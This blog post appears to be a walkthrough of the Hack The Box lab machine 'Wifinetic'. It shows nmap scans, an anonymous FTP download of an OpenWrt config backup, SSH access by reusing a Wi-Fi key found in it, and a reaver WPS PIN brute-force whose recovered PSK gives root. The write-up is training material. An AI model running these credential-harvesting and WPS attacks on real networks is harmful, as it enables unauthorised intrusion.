---
layout: post
title: HTB Wifinetic  
subtitle: Easy Box
thumbnail-img: /assets/img/wifinetic.png
tags: [HTB]
---

## Enumeration
In the initial phase of a penetration test, my first step is to conduct a scan using `nmap`. In a real-world scenario, this would start with a host discovery scan to identify machines, followed by a more detailed port scan. However, since Hack The Box already provided the machine's IP, I proceeded directly with the comprehensive scan. The results revealed three open ports: FTP on port 21, SSH on port 22, and a likely DNS service on port 53. `nmap` also provided some preliminary information using its built-in scripts. It detected that FTP allows anonymous login and is running vsftpd 3.0.3. Additionally, it provided the SSH version along with some associated keys. Port 53 yielded minimal information, necessitating manual enumeration.

```
[zonifer@dell wifinetic]$ nmap -p- -sVC -oN nmap.scan 10.10.11.247 --min-rate 1000

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP TCP/21
The `nmap` scan revealed that anonymous login is enabled on this server, hosting several files. My approach is to connect to the server and download everything available. This might contain sensitive data or information leading to further access. The `wget` command, commonly used with web servers, can also be employed for FTP downloads. The command below achieves this:
```
[zonifer@dell wifinetic]$ wget -m ftp://anonymous@10.10.11.247   
...
```

A majority of the files pertain to a project focused on migrating from OpenWrt (an OS for embedded devices) to Debian. Notably, a tarball of the `/etc/` folder for one of these devices was also present.

```
[zonifer@dell 10.10.11.247]$ tar -xvf backup-OpenWrt-2023-07-26.tar 
./etc/                         
./etc/config/                  
./etc/config/system 

...

[zonifer@dell 10.10.11.247]$ cd etc
[zonifer@dell etc]$ ls
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key
```


The `passwd` file provided a list of usernames: `root & netadmin`. Further enumeration led me to a config folder housing a `wireless` file, containing passwords for a wireless network.

```
[zonifer@dell etc]$ cd config/
[zonifer@dell config]$ ls      
dhcp  dropbear  firewall  luci  network  rpcd  system  ucitrack  uhttpd  wireless
[zonifer@dell config]$ cat wireless 

[snip]

config wifi-iface 'wifinet0'   
        option device 'radio0'                                                                                                                          
        option mode 'ap'            
        option ssid 'OpenWrt'         
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'                                           
                                      
config wifi-iface 'wifinet1' 
        option device 'radio1'
        option mode 'sta'  
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

Whenever I encounter a password, especially if reused in a config file, I attempt to use it for authentication. It's a common occurrence for users to reuse passwords, and I've observed this in numerous engagements. In this case, the administrator had indeed reused the password for the SSH account.
```
[zonifer@dell config]$ ssh root@10.10.11.247
root@10.10.11.247's password:  VeRyUniUqWiFIPasswrd1!            Permission denied, please try again.

[zonifer@dell config]$ ssh netadmin@10.10.11.247
netadmin@10.10.11.247's password: VeRyUniUqWiFIPasswrd1!  
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 15 Sep 2023 05:20:27 AM UTC

  System load:            0.0
  Usage of /:             68.1% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              228
  Users logged in:        0
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:d30e
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 14 20:01:26 2023 from 10.10.14.7
netadmin@wifinetic:~$ 
```

## Priv Esc
Upon conducting basic system enumeration, it became apparent that there are five interfaces associated with this device. Firstly, `eth0` serves as the wired connection used for SSH access. Subsequently, `mon0` likely represents a wireless card functioning in monitor mode, commonly employed for troubleshooting and wireless testing. Moving forward, `wlan1` seems linked to a network and is likely associated with a wireless device, given its name. Conversely, `wlan2`, while likely a wireless network interface card (NIC), lacks an assigned IP address, indicating it's not currently connected to any network. Lastly, `wlan0` stands out with its intriguing IP address of 192.168.1.1. It's highly probable that this interface plays a role in network routing functions.

```
netadmin@wifinetic:~$ ifconfig                                              
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500       
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                     
        inet 127.0.0.1  netmask 255.0.0.0                        mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500       wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500      
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255    
wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500 
	inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500              
```

Given the multitude of wireless activity on this device, I suspect that the path to root involves some form of wireless attack. Having a NIC already set in monitor mode opens up possibilities for wireless attacks. I noticed `reaver` among the tools installed on this machine,  it is used for brute force attacks on a router with WPS authentication enabled. I decided to employ it on the `wlan0` device, suspecting it to be some sort of Access Point. The syntax for this is `reaver -i INTERFACE -c CHANNEL -b BSSID -vv`. While I know the interface of the monitor card, I still need to ascertain the channel and ESSID of the AP. The `iw dev` command can provide me with more information about the wireless networks this machine is connected to. The output confirmed the BSSID as `02:00:00:00:00:00` and it operates on channel `1`.

```
netadmin@wifinetic:~$ iw dev

[snip]

phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00 
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
netadmin@wifinetic:~$ 
```

The attack proved successful, with `reaver` retrieving the PIN and subsequently recovering the Pre-Shared Key (PSK).

```
netadmin@wifinetic:~$ reaver -i mon0 -c 1 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.

```

Since the admin reused previous wireless passwords, I tried it on the root account and successfully gained access.
```
[zonifer@dell wifinetic]$ ssh root@10.10.11.247
root@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 15 Sep 2023 05:53:06 AM UTC

  System load:            0.0
  Usage of /:             68.7% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              233
  Users logged in:        1
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:d30e
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 12 12:07:58 2023
root@wifinetic:~# 
```
